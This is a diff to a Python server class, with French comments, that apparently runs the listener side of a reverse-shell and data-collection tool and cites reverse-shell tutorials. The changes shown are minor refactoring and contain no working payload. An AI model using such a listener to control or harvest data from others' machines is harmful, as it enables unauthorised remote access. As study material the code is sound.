@@ -8,14 +8,17 @@ import os
 import platform
 import json
 
+from dao import Dao
+
 class Server():
     def __init__(self):
         self._host = "0.0.0.0"
         self.cSocket = []
         self.cAddr = []
-        self._serverThreadList = [self._serverData, self._serverReverseShell]
         self.inSession = False
         self._alreadyConnected = {}
+        self._serverThreadList = [self._serverData, self._serverReverseShell]
+        self.runningThreadList = []
 
 
     def returnServerList(self):
@@ -84,7 +87,7 @@ class Server():
             # for k,v in data.items():
             #     print(k)
             #     print(v)
-            print("Receiving DATA")
+            # print("Receiving DATA")
             # TODO: Change print for DAO
 
     def _serverReverseShell(self, s):
@@ -162,9 +165,7 @@ class Server():
         # Démarre deux threads pour recevoir les connexions: 1- ReverseShell 2- reception de données
         for server in self._serverThreadList:
             s = socket.socket()
-            threading.Thread(target=server, args=(s,)).start()
-            
-
+            threading.Thread(target=server, args=(s,), daemon=True).start()
 
 if __name__ == "__main__":
    Server().main()
@@ -180,5 +181,7 @@ if __name__ == "__main__":
         Utilisation de thread pour prendre en charge plusieurs connexions client à la fois
 .. [3]  https://www.thepythoncode.com/article/create-reverse-shell-python
         Création d'un reverse shell
+.. [4]  https://github.com/spectertraww/PwnLnX
+        Création d'une liste d'object c_socket pour pouvoir intéragir à notre guise avec chaque connexion
 
 '''
